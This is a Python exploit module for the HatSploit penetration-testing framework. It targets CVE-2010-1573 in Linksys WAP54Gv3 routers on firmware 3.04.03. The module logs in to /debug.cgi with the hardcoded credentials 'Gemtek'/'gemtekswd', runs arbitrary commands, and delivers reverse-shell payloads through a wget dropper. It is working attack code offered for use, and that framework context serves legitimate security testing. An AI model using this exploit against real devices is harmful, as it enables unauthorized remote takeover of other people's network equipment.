"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, Handler, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "Linksys WAP54Gv3 debug Remote Code Execution",
            'Module': "exploit/linux/linksys/wap54gv3_debug_rce",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Phil Purviance - vulnerability researcher",
            ],
            'Description': (
                "Linksys WAP54Gv3 with firmware version 3.04.03 has a hardcoded "
                "credentials allowing code execution."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Payload': {
                PayloadInlineMixin: {
                    'Value': "unix/generic/bash_reverse_tcp",
                    'Platform': [OS_LINUX, OS_UNIX],
                    'Arch': [ARCH_GENERIC],
                },
                PayloadDropMixin: {
                    'Value': "linux/mipsle/shell_reverse_tcp",
                    'Platform': [OS_LINUX],
                    'Arch': [ARCH_MIPSLE, ARCH_MIPSBE],
                }
            },
            'Devices': [
                "Linksys WAP54Gv3 - firmware version 3.04.03"
            ],
            'References': [
                {'URL': 'https://www.cvedetails.com/cve/CVE-2010-1573/'},
                {'URL': 'https://nvd.nist.gov/vuln/detail/CVE-2010-1573'},
                {'URL': 'http://seclists.org/bugtraq/2010/Jun/93'},
                {'CVE': '2010-1573'}
            ],
            'DisclosureDate': "2010-06-09",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [RELIABLE_SESSION],
                'SideEffects': [],
            }
        })

    def __call__(self):
        self.dropper.set('wget')

    def exploit(self, command):
        response = self.http_request(
            method="POST",
            path='/debug.cgi',
            data={"data1": command, "command": "ui_debug"},
            auth=("Gemtek", "gemtekswd"),
        )

        output = re.findall(
            '<textarea rows=30 cols=100>(.+?)</textarea>', response.text, re.DOTALL
        )

        if len(output):
            return output[0]

    def check(self):
        response = self.http_request(
            method="GET",
            path="/debug.cgi",
            auth=("Gemtek", "gemtekswd"),
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        self.module_handle(
            sender=self.exploit,
        )
